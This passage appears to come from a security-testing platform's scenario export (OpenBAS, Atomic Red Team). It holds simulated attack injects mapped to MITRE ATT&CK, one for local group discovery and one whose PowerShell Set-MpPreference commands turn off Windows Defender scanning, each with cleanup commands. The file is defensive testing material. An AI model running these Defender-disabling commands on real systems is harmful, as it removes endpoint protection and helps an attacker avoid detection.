          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "25783346-ab29-4c98-995d-397ee7659f75",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "25783346-ab29-4c98-995d-397ee7659f75",
      "injector_contract_labels" : {
        "en" : "Basic Permission Groups Discovery Windows (Local)",
        "fr" : "Basic Permission Groups Discovery Windows (Local)"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Basic Permission Groups Discovery Windows (Local)\",\"fr\":\"Basic Permission Groups Discovery Windows (Local)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"25783346-ab29-4c98-995d-397ee7659f75\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "e4435f95-586c-4fb3-8853-bf239ed98803",
        "payload_type" : "Command",
        "payload_name" : "Basic Permission Groups Discovery Windows (Local)",
        "payload_description" : "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "6dcd9e32-77be-46fe-a10f-8aaa2afe4d12",
          "attack_pattern_name" : "Local Groups",
          "attack_pattern_description" : "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
          "attack_pattern_external_id" : "T1069.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
            "phase_external_id" : "TA0007",
            "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
            "phase_name" : "Discovery",
            "phase_shortname" : "discovery",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "phase_order" : 8
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "1f454dd6-e134-44df-bebb-67de70fb6cd8",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:46.424492Z",
        "payload_updated_at" : "2025-07-03T14:50:48.622160Z",
        "command_executor" : "cmd",
        "command_content" : "net localgroup\nnet localgroup \"Administrators\"\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:46.436581Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:46.436581Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "6dcd9e32-77be-46fe-a10f-8aaa2afe4d12",
        "attack_pattern_name" : "Local Groups",
        "attack_pattern_description" : "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
        "attack_pattern_external_id" : "T1069.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
          "phase_external_id" : "TA0007",
          "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
          "phase_name" : "Discovery",
          "phase_shortname" : "discovery",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
          "phase_order" : 8
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "2d253b1e-c45b-4860-9a8e-758c106ad7d5",
    "inject_title" : "Tamper with Windows Defender ATP PowerShell",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1320,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Tamper with Windows Defender ATP PowerShell",
          "fr" : "Tamper with Windows Defender ATP PowerShell"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "49ff8a12-a197-4bfc-b1ee-70c45ccc7242",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "49ff8a12-a197-4bfc-b1ee-70c45ccc7242",
      "injector_contract_labels" : {
        "en" : "Tamper with Windows Defender ATP PowerShell",
        "fr" : "Tamper with Windows Defender ATP PowerShell"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Tamper with Windows Defender ATP PowerShell\",\"fr\":\"Tamper with Windows Defender ATP PowerShell\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"49ff8a12-a197-4bfc-b1ee-70c45ccc7242\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "578d2fd5-1c34-41b9-9e79-e3f9d4d321a8",
        "payload_type" : "Command",
        "payload_name" : "Tamper with Windows Defender ATP PowerShell",
        "payload_description" : "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "9ba3228e-bd66-43d1-b774-f37d3757efd8",
          "attack_pattern_name" : "Disable or Modify Tools",
          "attack_pattern_description" : "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
          "attack_pattern_external_id" : "T1562.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
            "phase_external_id" : "TA0005",
            "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
            "phase_name" : "Defense Evasion",
            "phase_shortname" : "defense-evasion",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "phase_order" : 6
          } ]
        } ],
        "payload_cleanup_executor" : "psh",
        "payload_cleanup_command" : "Set-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n",
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "6b8df440-51ec-4d53-bf83-899591c9b5d7",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:40.386687Z",
        "payload_updated_at" : "2025-07-03T14:45:26.204900Z",
        "command_executor" : "psh",
        "command_content" : "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:40.401816Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:40.401817Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "9ba3228e-bd66-43d1-b774-f37d3757efd8",
        "attack_pattern_name" : "Disable or Modify Tools",
        "attack_pattern_description" : "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) 